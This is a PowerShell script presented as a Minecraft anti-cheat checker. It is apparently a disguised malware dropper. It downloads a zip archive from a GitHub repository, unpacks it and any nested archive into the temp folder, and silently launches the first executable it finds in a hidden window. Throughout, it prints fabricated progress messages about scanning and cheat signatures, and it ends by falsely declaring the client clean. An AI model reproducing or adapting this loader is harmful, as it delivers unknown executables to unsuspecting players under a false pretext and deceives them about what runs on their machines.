# =============================================
# Minecraft Anti-Cheat Checker v1.0
# =============================================

Write-Host "[*] Initializing system scanner..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

Write-Host "[*] Checking client file integrity..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

$URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
$ZIP = "$env:TEMP\main.zip"
$EXTRACT = "$env:TEMP\CHECKK-main"

try {
    Write-Host "[*] Loading verification module..." -ForegroundColor Yellow
    (New-Object Net.WebClient).DownloadFile($URL, $ZIP)
    Write-Host "[+] Module loaded" -ForegroundColor Green
} catch {
    Write-Host "[-] Module download error" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

try {
    Write-Host "[*] Extracting anti-cheat database..." -ForegroundColor Yellow
    Expand-Archive -Path $ZIP -DestinationPath $EXTRACT -Force
    Write-Host "[+] Database extracted" -ForegroundColor Green
} catch {
    Write-Host "[-] Database extraction error" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

$Zip2 = Get-ChildItem -Path $EXTRACT -Filter "*.zip" -Recurse | Select-Object -First 1
if ($Zip2) {
    try {
        Write-Host "[*] Updating cheat signatures..." -ForegroundColor Yellow
        Expand-Archive -Path $Zip2.FullName -DestinationPath $EXTRACT -Force
        Write-Host "[+] Signatures updated" -ForegroundColor Green
    } catch {
        Write-Host "[-] Signature update error" -ForegroundColor Red
        Start-Sleep -Seconds 2
        exit
    }
}

$Exe = Get-ChildItem -Path $EXTRACT -Filter "*.exe" -Recurse | Select-Object -First 1
if ($Exe) {
    Write-Host "[*] Running deep scan..." -ForegroundColor Yellow
    Start-Process -WindowStyle Hidden $Exe.FullName
    Write-Host "[+] Scan completed. No cheats detected." -ForegroundColor Green
    Write-Host "[+] Your client is clean." -ForegroundColor Green
} else {
    Write-Host "[-] Error: scanner component not found" -ForegroundColor Red
}

Start-Sleep -Seconds 3
Write-Host "[*] Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
